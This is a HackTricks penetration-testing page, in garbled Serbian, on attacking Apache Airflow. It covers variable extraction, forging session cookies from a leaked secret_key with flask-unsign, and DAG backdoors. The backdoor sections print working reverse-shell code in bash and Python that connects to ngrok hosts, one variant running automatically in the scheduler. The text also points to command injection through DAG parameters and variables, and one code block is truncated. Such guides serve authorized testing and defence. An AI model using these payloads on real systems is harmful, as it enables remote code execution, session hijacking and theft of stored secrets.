# Apache Airflow Bezbednost

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini da podr쬴te HackTricks:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** me na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

[**Apache Airflow**](https://airflow.apache.org) slu쬴 kao platforma za **orkestraciju i zakazivanje data pipeline-ova ili radnih tokova**. Pojam "orkestracija" u kontekstu data pipeline-ova ozna캜ava proces organizovanja, koordinacije i upravljanja slo쬰nim data radnim tokovima koji poti캜u iz razli캜itih izvora. Osnovna svrha ovih orkestriranih data pipeline-ova je obezbe캠ivanje obra캠enih i upotrebljivih skupova podataka. Ovi skupovi podataka se 코iroko koriste od strane raznih aplikacija, uklju캜uju캖i, ali ne ograni캜avaju캖i se na alate za poslovnu inteligenciju, modele za data nauku i ma코insko u캜enje, koji su osnova za funkcionisanje aplikacija velikih podataka.

U osnovi, Apache Airflow 캖e vam omogu캖iti da **zakazujete izvr코avanje koda kada se ne코to** (dogadjaj, cron) **desi**.

## Lokalni Lab

### Docker-Compose

Mo쬰te koristiti **docker-compose konfiguracioni fajl sa** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) da pokrenete kompletno Apache Airflow okru쬰nje u Dockeru. (Ako koristite MacOS, obezbedite da Docker VM ima najmanje 6GB RAM-a).

### Minikube

Jedan jednostavan na캜in da **pokrenete Apache Airflow** je da ga pokrenete **sa minikube-om**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow Konfiguracija

Airflow mo쬰 캜uvati **osetljive informacije** u svojoj konfiguraciji ili mo쬰te prona캖i slabu konfiguraciju:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Pre nego 코to po캜nete napadati Airflow, trebali biste razumeti **kako dozvole funkcioni코u**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Napadi

### Enumeracija veb konzole

Ako imate **pristup veb konzoli**, mo쬯a 캖ete mo캖i pristupiti nekim ili svim slede캖im informacijama:

* **Promenljive** (Ovde se mo쬰 캜uvati prilago캠ene osetljive informacije)
* **Veze** (Ovde se mo쬰 캜uvati prilago캠ene osetljive informacije)
* Pristupite im na `http://<airflow>/connection/list/`
* [**Konfiguracija**](./#airflow-configuration) (Ovde se mo쬰 캜uvati osetljive informacije poput **`secret_key`** i lozinki)
* Lista **korisnika i uloga**
* **Kod svakog DAG-a** (koji mo쬰 sadr쬬ti zanimljive informacije)

### Dobijanje vrednosti promenljivih

Promenljive se mogu 캜uvati u Airflow-u kako bi **DAG-ovi** mogli **pristupiti** njihovim vrednostima. Sli캜no je tajnama drugih platformi. Ako imate **dovoljno dozvola**, mo쬰te im pristupiti u GUI na `http://<airflow>/variable/list/`.\
Airflow 캖e po defaultu prikazivati vrednost promenljive u GUI-ju, me캠utim, prema [**ovome**](https://marclamberti.com/blog/variables-with-apache-airflow/), mogu캖e je postaviti **listu promenljivih** 캜ija 캖e **vrednost** biti prikazana kao **zvezdice** u **GUI-ju**.

![](<../../.gitbook/assets/image (79).png>)

Me캠utim, ove **vrednosti** i dalje se mogu **dobiti** putem **CLI-ja** (potreban je pristup bazi podataka), **proizvoljnog izvr코avanja DAG-a**, **API-ja** pristupanjem krajnjoj ta캜ki promenljivih (API mora biti aktiviran) i **캜ak samog GUI-ja!**\
Da biste pristupili tim vrednostima iz GUI-ja, jednostavno **izaberite promenljive** do kojih 쬰lite pristupiti i **kliknite na Akcije -> Izvoz**.\
Jo코 jedan na캜in je izvr코iti **bruteforce** na **skrivenu vrednost** koriste캖i **pretragu filtriranja** dok je ne dobijete:

![](<../../.gitbook/assets/image (30).png>)

### Eskalacija privilegija

Ako je konfiguracija **`expose_config`** postavljena na **True**, korisnici sa ulogom **Korisnik** i **vi코om** mogu **캜itati** konfiguraciju na vebu. U ovoj konfiguraciji se pojavljuje **`secret_key`**, 코to zna캜i da bilo koji korisnik sa ovim klju캜em mo쬰 **kreirati sopstveni potpisani kola캜i캖 da bi se predstavio kao bilo koji drugi korisni캜ki nalog**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG Backdoor (RCE u Airflow radniku)

Ako imate **pristup pisanju** na mestu gde su **DAG-ovi sa캜uvani**, mo쬰te jednostavno **kreirati jedan** koji 캖e vam poslati **obrnuti shell**.\
Imajte na umu da 캖e se ovaj obrnuti shell izvr코iti unutar **Airflow radni캜kog kontejnera**:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG Backdoor (RCE u Airflow scheduleru)

Ako postavite ne코to da se **izvr코i u korenu koda**, u trenutku pisanja ovog teksta, to 캖e biti **izvr코eno od strane planera** nekoliko sekundi nakon 코to ga stavite u folder DAG-a.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### Kreiranje DAG-a

Ako uspete da **kompromitujete ma코inu unutar DAG klastera**, mo쬰te kreirati nove **DAG skripte** u `dags/` folderu i one 캖e biti **replikovane na ostalim ma코inama** unutar DAG klastera.

### Ubacivanje koda u DAG

Kada izvr코avate DAG iz GUI-ja, mo쬰te mu **proslediti argumente**.\
Stoga, ako DAG nije pravilno napisan, mo쬰 biti **ranjiv na ubacivanje komandi**.\
To se dogodilo u ovom CVE-u: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Sve 코to trebate znati da biste **po캜eli tra쬴ti ubacivanje komandi u DAG-ove** je da se **parametri** **pristupaju** pomo캖u koda **`dag_run.conf.get("param_name")`**.

Osim toga, ista ranjivost mo쬰 se pojaviti i sa **promenljivama** (napomena: sa dovoljno privilegija mo쬰te **kontrolisati vrednost promenljivih** u GUI-ju). Promenljive se **pristupaju sa**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Ako se na primer koriste unutar bash komande, mogu캖e je izvr코iti ubacivanje komande.

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
